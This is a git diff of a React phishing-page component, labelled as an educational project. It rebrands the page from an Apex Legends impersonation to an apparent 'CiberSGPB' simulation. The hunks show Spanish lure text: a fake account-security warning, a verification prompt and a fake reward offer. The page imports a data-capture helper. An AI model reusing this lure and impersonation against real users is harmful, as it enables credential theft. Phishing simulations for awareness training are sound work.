@@ -6,7 +6,7 @@ import { captureData } from '../utils/api';
  * PhishingPage - Exact React version of glitch.html
  *
  * ⚠️ EDUCATIONAL CYBERSECURITY PROJECT ⚠️
- * Converted from APEX/public/glitch.html
+ * Converted from CiberSGPB phishing simulation
  */
 
 const PhishingPageNew = () => {
@@ -249,7 +249,7 @@ const PhishingPageNew = () => {
               ¡ADVERTENCIA DE SEGURIDAD!
             </h2>
             <p className="text-xl mb-6 text-gray-300">
-              Se ha detectado actividad sospechosa en tu cuenta de Apex Legends
+              Se ha detectado actividad sospechosa en tu cuenta de CiberSGPB
             </p>
             <p className="text-lg mb-4 text-gray-400">
               Alguien intentó acceder desde una ubicación desconocida
@@ -273,7 +273,7 @@ const PhishingPageNew = () => {
           <div className="max-w-md w-full">
             <div className="text-center mb-8">
               <h1 className="text-5xl font-bold mb-2">
-                <span className="text-apex-red">APEX</span> <span className="text-white">LEGENDS</span>
+                <span className="text-apex-red">CiberSGPB</span> <span className="text-white">PORTAL</span>
               </h1>
               <p className="text-apex-gold text-xl">Verificación de Cuenta Requerida</p>
             </div>
@@ -285,7 +285,7 @@ const PhishingPageNew = () => {
                   ¡Reclama tus Recompensas Exclusivas!
                 </h2>
                 <p className="text-gray-400">
-                  Oferta por tiempo limitado: 1,000 Apex Coins + Skin Legendaria
+                  Oferta por tiempo limitado: Acceso Premium + Beneficios Exclusivos
                 </p>
               </div>
 
